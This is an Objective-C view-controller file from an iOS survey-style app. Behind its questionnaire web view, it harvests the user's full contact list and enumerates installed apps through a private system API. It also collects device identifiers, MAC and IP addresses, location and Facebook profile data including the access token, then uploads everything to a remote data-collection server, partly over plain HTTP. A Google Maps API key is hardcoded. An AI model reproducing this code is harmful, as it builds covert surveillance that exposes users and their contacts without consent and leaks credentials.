//
//  Gestion.m
//  IOSApp
//
//  Created by Reinier Isalgue on 12/06/17.
//  Copyright © 2017 MyGroup. All rights reserved.
//

#import "Gestion.h"
#import "ContactList.h"
#include <objc/runtime.h>
#include <sys/utsname.h>
#include <sys/types.h>
#import "iHasApp.h"
#import "AFHTTPSessionManager.h"
#import "NICInfo.h"
#import "NICInfoSummary.h"
#import "TSMessage.h"

#include <stdio.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <net/if.h>
#include <string.h>
#include <arpa/inet.h>

#import "SystemServices.h"
#define SystemSharedServices [SystemServices sharedServices]

#define ApiKeyGMap  @"AIzaSyDbSdYV6U78iQ3XZ_w4MsG7kZ13eaYLd-k"


@interface LSApplicationProxy : NSObject // LSBundleProxy <NSSecureCoding>
@property(readonly, nonatomic) NSString *applicationDSID;
@property(readonly, nonatomic) NSString *applicationIdentifier;
@property(readonly, nonatomic) NSString *applicationType;
@property(readonly, nonatomic) BOOL isContainerized;
@property(readonly, nonatomic) NSString *shortVersionString;
- (long)bundleModTime;
- (id)localizedName;
- (id)resourcesDirectoryURL;
@end

@interface JSInterface : NSObject
@end

@interface Gestion ()

@end

@implementation Gestion

-(void)LoadFacebookInformation:(NSDictionary*)pFacebook whitImageProfile:(UIImage *)pImage{
    //NSLog(@"Loading FB Information in GEstion %@",pFacebook);
    Facebook = pFacebook;
    imageProfileFB = pImage;
    
}
- (void)viewDidLoad {
    [super viewDidLoad];
    
    //[self AuthorizeLocation];
    [[imageProfile layer]setCornerRadius:imageProfile.frame.size.width/2];
    imageProfile.clipsToBounds = YES;
    if ([Facebook objectForKey:@"Name"]==nil) {
        fbNameLb.text = @"";
    }
    else{
        fbNameLb.text = [Facebook objectForKey:@"Name"];
    }
    
    [imageProfile setImage:imageProfileFB];
    
    [self contactScan];
    //myWebView.delegate = self;
    // Do any additional setup after loading the view from its nib.
}
-(void)webViewDidSartLoad:(UIWebView *)webView{
    
    NSLog(@"WEbView Sarting");
}
-(void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error{
    NSLog(@"Load WebView error %@",error.description);
}
-(void)webViewDidFinishLoad:(UIWebView *)webView{
    NSLog(@"WEbView Load Finish ");
}

-(void)LoginUsertoTest{
    
//url: http://test.hddeveloperteam.com/index.php/wizard/upd_resq/EN/216b54a73ab7f192/31/M/roelkis.og@gmail.com/Madrid/EAAadLmmvGVwB
    
  //  que los parametros serian http://test.hddeveloperteam.com/index.php/wizard/upd_resq/lang/user/sexo/email/ciudad/facebToken
    
    if([FBSDKAccessToken currentAccessToken]) {
        _gender = [[[Facebook objectForKey:@"Gender"] substringToIndex:1] uppercaseString];
        _fbToken = [Facebook objectForKey:@"FBAccessToken"];
        int YearAux = [[[[Facebook objectForKey:@"Birthday"] componentsSeparatedByString:@"/"] objectAtIndex:2]intValue];
        NSDateFormatter * dateFormat = [[NSDateFormatter alloc] init];
        [dateFormat setDateFormat:@"yyyy-MM-dd"];
        NSString * nowDate = [dateFormat stringFromDate:[NSDate date]];
        int nowYear = [[[nowDate componentsSeparatedByString:@"-"] objectAtIndex:0] intValue];
        _age = [NSString stringWithFormat:@"%d",nowYear-YearAux];
    }
    
    else{
        _gender = [Facebook objectForKey:@"Gender"];
        _fbToken = @"null";
        _age = [Facebook objectForKey:@"Age"];
        _locality = [Facebook objectForKey:@"Locality"];
    }
    /*
    if ([Location objectForKey:@"Locality"]==nil){
        _locality = @"null";
    }
    else{
        _locality = [Location objectForKey:@"Locality"];
    }*/
    NSString * urlstring =  [NSString stringWithFormat:@"http://test.hddeveloperteam.com/index.php/wizard/upd_resq/%@/%@/%@/%@/%@/%@/%@",_lenguage,SystemInfo[@"SmartId"],_age,_gender,[Facebook objectForKey:@"Email"],_locality,_fbToken];
     /*
       NSString * urlstring = @"http://test.humandatamanager.com/test.php?";
                            NSDictionary * parameters = @{@"g":@1,
                                                          @"tag":@"upd_resq",
                                                          @"Inciso":@2,
                                                          @"tipo":@4,
                                                          @"lat":[Location objectForKey:@"Latitude"],
                                                          @"lon":[Location objectForKey:@"Longitude"],
                                                          @"Encuesta":@2,
                                                          @"Usuario":[SystemInfo objectForKey:@"SmartId"],
                                                          @"sexo":[Facebook objectForKey:@"Gender"],
                                                          @"ciudad":[Location objectForKey:@"Locality"],
                                                          @"email":[Facebook objectForKey:@"Email"],
                                                          @"Version":@2.0};

    
    
    [self postRequest:urlstring parameters:nil completionHandler:^(NSString * responseString, NSDictionary * responseDictionary) {
        NSLog(@"Response String Login User Test%@", responseString);
        NSLog(@"Response Dictionary Login User Test %@", responseDictionary);
            [self LoadWebView];
    }];*/
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlstring]
                                                           cachePolicy:NSURLRequestUseProtocolCachePolicy
                                                       timeoutInterval:10.0];
    [request setHTTPMethod:@"GET"];
    //[request setAllHTTPHeaderFields:headers];
    //[request setHTTPBody:postData];
    
    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request
                                                completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                                                    if (error) {
                                                        NSLog(@"%@", error);
                                                    } else {
                                                        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
                                                        NSLog(@"%@", httpResponse);
                                                        [self LoadWebView];
                                                    }
                                                }];
    [dataTask resume];
    /*NSLog(@"Login User to Test with UR: : %@", urlstring);
    [self getRequest:urlstring parameters:@{@"user":@"test"} completionHandler:^(NSString * responseString, NSDictionary *responseDictionary) {
        NSLog(@"Response String Login User Test%@", responseString);
        NSLog(@"Response Dictionary Login User Test %@", responseDictionary);
        [self LoadWebView];
    }];*/
    //[self.myLocationManager startUpdatingLocation];
}
-(void)LoadWebView{
    //NSString * urlstring = [NSString stringWithFormat:@"http://test.humandatamanager.com/test.php?g=1&tag=run_q&Encuesta=2&Usuario=%@&Version=2.0",
                            //[SystemInfo objectForKey:@"SmartId"]];    last url
    
     //http://test.hddeveloperteam.com/index.php/wizard/continueProcess/lang/user
    
    NSString * urlstring = [NSString stringWithFormat:@"http://test.hddeveloperteam.com/index.php/wizard/continueProcess/%@/%@",_lenguage,[SystemInfo objectForKey:@"SmartId"]];
    NSLog(@"Open Web Test: %@", urlstring);
    [myWebView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:urlstring]]];
    timerActiviyLoading = [NSTimer scheduledTimerWithTimeInterval:1.0/2.0 target:self selector:@selector(LoadingQuestionary) userInfo:nil repeats:YES];
}

-(void)LoadingQuestionary{
    if (!myWebView.loading) {
        [loadingActivity stopAnimating];
    }
    else{
        [loadingActivity startAnimating];
    }
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

-(void)GetAllInstalledApss{
    NSLog(@"Listing Apss ==>");
    
    Class LSApplicationWorkspace_class = objc_getClass("LSApplicationWorkspace");
    Class LSResourceProxy_class = objc_getClass("LSResourceProxy");
    Class LSBundleProxy_class = objc_getClass("LSBundleProxy");
    //Class LSApplicationProxy_class = objc_getClass("LSApplicationProxy");
    SEL defaultWorkspace = NSSelectorFromString(@"defaultWorkspace");
    SEL selectorALL = NSSelectorFromString(@"allApplications");
    NSObject * workspace = [LSApplicationWorkspace_class performSelector:defaultWorkspace];
    NSArray * Apps = [workspace performSelector:selectorALL];

    NSLog(@"No %lu",(unsigned long)[[workspace performSelector:selectorALL] count]);
    
    for (LSApplicationProxy * app in Apps)
    {
        NSString *localizedName = app.localizedName;
        NSString * shortVersion = @"0";
        if (app.shortVersionString!=nil) {
            shortVersion = app.shortVersionString;
        }
        if([app.applicationType isEqualToString:@"User"]){
            
            if (Packages==nil) {
                Packages = [[NSMutableArray alloc] initWithObjects:@{@"ApplicationName":localizedName,
                                                                     @"VersionCode":app.applicationDSID,
                                                                     @"PackageName":app.applicationIdentifier,
                                                                     @"VersionName":shortVersion}, nil];
            }
            else{
                [Packages addObject:@{@"ApplicationName":localizedName,
                                      @"VersionCode":app.applicationDSID,
                                      @"PackageName":app.applicationIdentifier,
                                      @"VersionName":shortVersion}];
            }
        }
    }
    NSLog(@"Packages: %@",Packages);
    
    [self AuthorizeLocation];
    [self SendAllData];
}
-(void)AuthorizeLocation
{
    self.myLocationManager = [[CLLocationManager alloc] init];
    
    if ([CLLocationManager locationServicesEnabled] )
    {
        self.myLocationManager.delegate = self;
        self.myLocationManager.distanceFilter = 1000;
        [self.myLocationManager requestAlwaysAuthorization];
        NSLog(@"Location Authorized");
        [self.myLocationManager startUpdatingLocation];
    }
    else
    {
        _requestMessage = @"We Need Your Location to performance the TEST";
        [self ShowError];
        [self SendAllData];
    }
}

-(void)GetSystemInfo{
    NSString * smartId = [[[UIDevice currentDevice]identifierForVendor] UUIDString];
    NSLog(@"SmartId: %@",smartId);
    NSString * systemVersion = [[UIDevice currentDevice]systemVersion];
    NSLog(@"System Version: %@", systemVersion);
    NSString * systemName = [[UIDevice currentDevice]systemName];
    NSLog(@"System Name: %@", systemName);
    NSString * systemLenguaje = [[NSLocale preferredLanguages]objectAtIndex:0];
    _lenguage = [[[systemLenguaje componentsSeparatedByString:@"-"] objectAtIndex:0] uppercaseString];
    NSLog(@"lemguaje: %@",_lenguage);
    NSLog(@"System Language: %@", systemLenguaje);
    NSString * manufacturer = @"Apple";  ////Find this
    NSString * brand = @"Ipad";
    if ([[UIDevice currentDevice]userInterfaceIdiom]==UIUserInterfaceIdiomPhone) {
        brand = @"Iphone";
    }
    NSString * dName = [[UIDevice currentDevice] name];
    NSLog(@"Device Name: %@", dName);
    // emei nt allowed
    NSString *publicIP = [NSString stringWithContentsOfURL:[NSURL URLWithString:@"https://icanhazip.com/"] encoding:NSUTF8StringEncoding error:nil];
    publicIP = [publicIP stringByTrimmingCharactersInSet:[NSCharacterSet newlineCharacterSet]]; // IP comes with a newline for some reason
    struct utsname systemInfo;
    uname(&systemInfo);
    
    NSString * model = [NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding];
    NSLog(@"Model %@",model);
    if (publicIP==nil) {
        publicIP = @"";
    }
    NSLog(@"Public IP: %@",publicIP);
    NSString * wifiIpAddress = [SystemSharedServices wiFiIPAddress];
    if (wifiIpAddress==nil) {
        wifiIpAddress = @"";
    }
    SystemInfo = @{@"SmartId":smartId,
                   @"System Version":systemVersion,
                   @"System Name":systemName,
                   @"System Language":systemLenguaje,
                   @"Manufacturer":manufacturer,
                   @"Brand":brand,
                   @"Model":model,
                   @"Name":dName,
                   @"IpV4Address":wifiIpAddress,
                   //@"IpV6Address":[SystemSharedServices wiFiIPv6Address],
                   @"WLanMacAddress":[SystemSharedServices wiFiMACAddress],
                   @"GatewayIpAddress":[SystemSharedServices wiFiRouterAddress],
                   @"IspIpAddress":publicIP};
    
    //NSLog(@"SystemInfo %@",SystemInfo);
    [self GetAllInstalledApss];
}

-(NSString*)GetMacAddres{
    NICInfoSummary * summary = [[NICInfoSummary alloc]init];
    NICInfo * wlanInfo = [summary findNICInfo:@"en0"];
    NSString * mac_address = [wlanInfo getMacAddressWithSeparator:@":"];
    
    if (wlanInfo.nicIPInfos.count>0) {
        NICIPInfo * ip_info = [wlanInfo.nicIPInfos objectAtIndex:0];
        NSString * ip = ip_info.ip;
        NSString * netMask = ip_info.netmask;
        _broadcast_ip = ip_info.broadcastIP;
        NSLog(@"IP: %@   netMask: %@  broadcast_Ip: %@",ip,netMask,ip_info.broadcastIP);
    }
    else{
        NSLog(@"Wifi not connected");
    }
    return mac_address;
}

- (void)contactScan
{
    if ([CNContactStore class]) {
        //ios9 or later
        CNEntityType entityType = CNEntityTypeContacts;
        if( [CNContactStore authorizationStatusForEntityType:entityType] == CNAuthorizationStatusNotDetermined)
        {
            CNContactStore * contactStore = [[CNContactStore alloc] init];
            [contactStore requestAccessForEntityType:entityType completionHandler:^(BOOL granted, NSError * _Nullable error) {
                if(granted){
                    [self getAllContact];
                }
                else{
                    [self GetSystemInfo];
                }
            }];
        }
        else if( [CNContactStore authorizationStatusForEntityType:entityType]== CNAuthorizationStatusAuthorized)
        {
            [self getAllContact];
        }
    }
}

-(void)getAllContact
{
    if([CNContactStore class])
    {
        //iOS 9 or later
        NSError* contactError;
        CNContactStore* addressBook = [[CNContactStore alloc]init];
        [addressBook containersMatchingPredicate:[CNContainer predicateForContainersWithIdentifiers: @[addressBook.defaultContainerIdentifier]] error:&contactError];
        NSArray * keysToFetch =@[CNContactEmailAddressesKey, CNContactPhoneNumbersKey, CNContactFamilyNameKey, CNContactGivenNameKey, CNContactPostalAddressesKey,CNContactTypeKey];
        CNContactFetchRequest * request = [[CNContactFetchRequest alloc]initWithKeysToFetch:keysToFetch];
        BOOL success = [addressBook enumerateContactsWithFetchRequest:request error:&contactError usingBlock:^(CNContact * __nonnull contact, BOOL * __nonnull stop){
            [self parseContactWithContact:contact];
        }];
        
        [self GetSystemInfo];
    }
}

- (void)parseContactWithContact :(CNContact* )contact
{
    NSString * firstName =  contact.givenName;
    NSString * lastName =  contact.familyName;
    //NSString * typeContac = contact.contactType;
    
    NSArray * phone = [[contact.phoneNumbers valueForKey:@"value"] valueForKey:@"digits"];
    NSString * email = [contact.emailAddresses valueForKey:@"value"];
    //NSArray * addrArr = [self parseAddressWithContac:contact];
    NSMutableDictionary * phoneDictionary;
    for (int i = 0; i<phone.count; i++) {
        if (phoneDictionary==nil) {
            NSDictionary * aux = @{[NSString stringWithFormat:@"%d",i+1]:[phone objectAtIndex:i]};
            phoneDictionary = [[NSMutableDictionary alloc] initWithDictionary:aux];
        }
        else {
            NSDictionary * aux = @{[NSString stringWithFormat:@"%d",i+1]:[phone objectAtIndex:i]};
            [phoneDictionary addEntriesFromDictionary:aux];
        }
    }
    if (phoneDictionary==nil) {
        phoneDictionary = [[NSMutableDictionary alloc] initWithDictionary:@{}];
    }
    NSDictionary * contacDictionary = @{@"AccountType": @"localContact",
                                        @"DisplayName": [NSString stringWithFormat:@"%@ %@",firstName,lastName],
                                        @"EmailAddresses": email,
                                        @"PhoneNumbers": phoneDictionary};
    if(Contacs==nil){
        Contacs = [[NSMutableArray alloc] initWithObjects:contacDictionary, nil];
    }
    else [Contacs addObject:contacDictionary];
    NSLog(@"ContacDictionary: %@",contacDictionary);
}

- (NSMutableArray *)parseAddressWithContac: (CNContact *)contact
{
    NSMutableArray * addrArr = [[NSMutableArray alloc]init];
    CNPostalAddressFormatter * formatter = [[CNPostalAddressFormatter alloc]init];
    NSArray * addresses = (NSArray*)[contact.postalAddresses valueForKey:@"value"];
    if (addresses.count > 0) {
        for (CNPostalAddress* address in addresses) {
            [addrArr addObject:[formatter stringFromPostalAddress:address]];
        }
    }
    return addrArr;
}

-(void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations{
    CLLocation * location = [locations lastObject];
    NSDate * eventDate = location.timestamp;
    
    CLLocationCoordinate2D currentLocation = CLLocationCoordinate2DMake(location.coordinate.latitude, location.coordinate.longitude);
    NSTimeInterval howRecent = [eventDate timeIntervalSinceNow];
    if (fabs(howRecent) < 15.0) {
        NSLog(@"Updating Location, %f, %f",currentLocation.latitude,currentLocation.longitude);
        [self FindAddresByGoogle:location];
        
    }
}

-(void)FindAddresByGoogle:(CLLocation*)myLocation{
    NSLog(@"Finding Geoposition address Google Maps");
    //myDestination = CLLocationCoordinate2DMake(myLocationManager.location.coordinate.latitude, myLocationManager.location.coordinate.longitude);
    
    NSString * lat = [NSString stringWithFormat:@"%f",myLocation.coordinate.latitude];
    NSString * lng = [NSString stringWithFormat:@"%f",myLocation.coordinate.longitude];
    
    NSString * stringURL = [NSString stringWithFormat:@"https://maps.googleapis.com/maps/api/geocode/json?latlng=%@,%@&key=%@",lat,lng,ApiKeyGMap];
    
    NSURL * url = [NSURL URLWithString:stringURL];
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    [manager GET:url.absoluteString parameters:nil progress:nil success:^(NSURLSessionTask *task, id responseObject) {
        //NSLog(@"JSON: %@", responseObject);
        NSArray * tempArray = [[[responseObject objectForKey:@"results"] objectAtIndex:0] objectForKey:@"address_components"];
        
        NSString * Thoroughfare, * Number, * Intersection, * Locality, * Country,*CountryName,*CountryCode,*SubAdminArea = @"";
        for (int i = 0; i<tempArray.count; i++) {
            if ([[[[tempArray objectAtIndex:i] objectForKey:@"types"] objectAtIndex:0]isEqualToString:@"route"]) {
                Thoroughfare = [[tempArray objectAtIndex:i] objectForKey:@"short_name"];
            }
            else if ([[[[tempArray objectAtIndex:i] objectForKey:@"types"] objectAtIndex:0]isEqualToString:@"street_number"]) {
                Number = [[tempArray objectAtIndex:i] objectForKey:@"short_name"];
                
            }
            else if([[[[tempArray objectAtIndex:i] objectForKey:@"types"] objectAtIndex:0]isEqualToString:@"neighborhood"]){
                Intersection = [[tempArray objectAtIndex:i] objectForKey:@"short_name"];
            }
            else if([[[[tempArray objectAtIndex:i] objectForKey:@"types"] objectAtIndex:0]isEqualToString:@"locality"]){
                Locality = [[tempArray objectAtIndex:i] objectForKey:@"short_name"];
            }
            else if([[[[tempArray objectAtIndex:i] objectForKey:@"types"] objectAtIndex:0]isEqualToString:@"country"]){
                CountryCode = Country = [[tempArray objectAtIndex:i] objectForKey:@"short_name"];
                CountryName = [[tempArray objectAtIndex:i] objectForKey:@"long_name"];
            }
            else if([[[[tempArray objectAtIndex:i] objectForKey:@"types"] objectAtIndex:0]isEqualToString:@"administrative_area_level_1"]){
                SubAdminArea = [[tempArray objectAtIndex:i] objectForKey:@"short_name"];
            }
        }
        Location = @{@"Country": Country,
                     @"CountryCode": CountryCode,
                     @"CountryName": CountryName,
                     @"Latitude": [NSNumber numberWithDouble:myLocation.coordinate.latitude],
                     @"Locality": Locality,
                     @"Longitude": [NSNumber numberWithDouble:myLocation.coordinate.longitude],
                     @"Provider": @"network",
                     @"Speed": [NSNumber numberWithDouble:myLocation.speed],
                     @"SubAdminArea": SubAdminArea,
                     @"Thoroughfare": Thoroughfare,
                     @"Time": [NSString stringWithFormat:@"%@",myLocation.timestamp]};
        NSLog(@"Location %@",Location);
        _locality = [Location objectForKey:@"Locality"];
        [self.myLocationManager stopUpdatingLocation];
        [self SendAllData];
        //[self GetAccounts];
    } failure:^(NSURLSessionTask *operation, NSError *error) {
        NSLog(@"Error: %@", error);
        [self SendAllData];
        //[self GetAccounts];
    }];
}

-(void)SendAllData{
    NSLog(@"Locality1 %@",_locality);
    
    _locality = [Location objectForKey:@"Locality"];
    NSLog(@"Locality2 %@",_locality);
    [self LoginUsertoTest];
    NSLog(@"Sending All data");
    //[self GetAccounts];
   // NSDateFormatter * dateFormat = [[NSDateFormatter alloc] init];
   // [dateFormat setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
    //NSString * nowDate = [dateFormat stringFromDate:[NSDate date]];
    if (Contacs.count==0) {
        [Contacs addObject:@{@"status":@"No Authorized"}];
    }
    if (Location==nil) {
        Location = @{@"status":@"No Authorized"};
    }
    if (Packages.count==0) {
        [Packages addObject:@{@"status":@"No App Installed"}];
    }

    NSDictionary * parameter = @{@"tag":@"pushdta",
                                 @"idUSR":SystemInfo[@"SmartId"],
                                 @"ApiVer":@"2.2",
                                 @"PrjPlatform":@"1",
                                 @"ApiDeveloper":@"2",
                                 @"PrjID":@"2",
                                 @"ApiDevKey":@"HDM",
                                 @"PrjKey": @"111112222222FF",
                                 @"DTA":@{@"Contacts":Contacs,
                                          @"Facebook":Facebook,
                                          @"Location":Location,
                                          @"Packages":Packages,
                                          @"SystemInfo":SystemInfo}};
    NSLog(@"All Parameters %@",parameter);
    //NSData * jsonData = [NSJSONSerialization dataWithJSONObject:parameter options:NSJSONWritingPrettyPrinted error:nil];
    
    //NSDictionary * dic = [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers error:nil];
    //NSLog(@"Formated Dictionary %@",dic);
    //AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    //manager.requestSerializer = [AFJSONRequestSerializer serializer];
    [self postRequest:@"https://webservice.humandatamanager.com/ProcessAPI.php" parameters:parameter completionHandler:^(NSString * responseString, NSDictionary * responseDictionary) {
        NSLog(@"Response String sending AllData: %@", responseString);
        NSLog(@"Response Dictionary sending AllData%@", responseDictionary);
        
    }];
    
}


-(void)GetAccounts{
    _accountStore = [[ACAccountStore alloc] init];
    ACAccountType * accountType = [_accountStore accountTypeWithAccountTypeIdentifier:ACAccountTypeIdentifierTwitter];
    //NSString *message = _textView.text;
    //hear before posting u can allow user to select the account
    arrayOfAccons = [_accountStore accountsWithAccountType:accountType];
    
    [_accountStore requestAccessToAccountsWithType:accountType options:nil completion:^(BOOL granted, NSError *error) {
        if (granted && error == nil) {
            arrayOfAccons = _accountStore.accounts;
            for(ACAccount *acc in arrayOfAccons)
            {
                NSLog(@"%@",acc.username);
                NSDictionary *properties = [acc dictionaryWithValuesForKeys:[NSArray arrayWithObject:@"properties"]];
                NSDictionary *details = [properties objectForKey:@"properties"];
                NSLog(@"user name = %@",[details objectForKey:@"fullName"]);//full name
                NSLog(@"user_id  =  %@",[details objectForKey:@"user_id"]);//user id
            }
            [self SendAllData];
        }
        else {
            NSLog(@"Access Denied");
            NSLog(@"%@",error.description);
            [self SendAllData];
        }
    }];
    /*
    for(ACAccount *acc in arrayOfAccons)
    {
        NSLog(@"%@",acc.username);
        NSDictionary *properties = [acc dictionaryWithValuesForKeys:[NSArray arrayWithObject:@"properties"]];
        NSDictionary *details = [properties objectForKey:@"properties"];
        NSLog(@"user name = %@",[details objectForKey:@"fullName"]);//full name
        NSLog(@"user_id  =  %@",[details objectForKey:@"user_id"]);//user id
    }*/
}
-(void)viewDidAppear:(BOOL)animated{
    //[self AuthorizeLocation];
    loadingActivity.center = myWebView.center;
}


-(void)postRequest:(NSString *)urlStr parameters:(NSDictionary *)parametersDictionary completionHandler:(void (^)(NSString*, NSDictionary*))completionBlock{
    NSURL *URL = [NSURL URLWithString:urlStr];
    
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.responseSerializer = [AFHTTPResponseSerializer serializer];
    //manager.requestSerializer = [AFJSONRequestSerializer serializerWithWritingOptions:NSJSONw];
    [manager POST:URL.absoluteString parameters:parametersDictionary progress:nil success:^(NSURLSessionDataTask *task, id responseObject) {
        NSError* error;
        NSDictionary* json = [NSJSONSerialization JSONObjectWithData:responseObject
                                                             options:kNilOptions
                                                               error:&error];
        NSLog(@"Success Post respone %@",json);
        completionBlock(@"Success Post",json);
    } failure:^(NSURLSessionDataTask *task, NSError *error) {
        NSLog(@"Error Post: %@", error.description);
        completionBlock(@"Error",nil);
    }];
}
-(void)getRequest:(NSString *)urlStr parameters:(NSDictionary *)parametersDictionary completionHandler:(void (^)(NSString*, NSDictionary*))completionBlock{
    NSURL *URL = [NSURL URLWithString:urlStr];
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.responseSerializer = [AFHTTPResponseSerializer serializer];
    [manager GET:URL.absoluteString parameters:parametersDictionary progress:nil success:^(NSURLSessionTask *task, id responseObject) {
        //NSError * error;
        //NSDictionary * json = [NSJSONSerialization JSONObjectWithData:responseObject
        //                                                      options:kNilOptions
        //                                                        error:&error];
        completionBlock(@"Succes",responseObject);
        //NSLog(@"JSON: %@", responseObject);
    } failure:^(NSURLSessionTask *operation, NSError *error) {
        NSLog(@"Error: %@", error.description);
        completionBlock(@"Error",nil);
    }];
}
- (void)ShowError
{
    [TSMessage showNotificationInViewController:self
                                          title:@"Error"
                                       subtitle:_requestMessage
                                          image:nil
                                           type:TSMessageNotificationTypeError
                                       duration:3.0
                                       callback:nil
                                    buttonTitle:nil
                                 buttonCallback:nil
                                     atPosition:TSMessageNotificationPositionTop
                           canBeDismissedByUser:YES];
}

- (void)ShowSuccess
{
    [TSMessage showNotificationInViewController:self
                                          title:@"Informacion"
                                       subtitle:_requestMessage
                                          image:nil
                                           type:TSMessageNotificationTypeSuccess
                                       duration:3.0
                                       callback:nil
                                    buttonTitle:nil
                                 buttonCallback:nil
                                     atPosition:TSMessageNotificationPositionTop
                           canBeDismissedByUser:YES];
}
@end
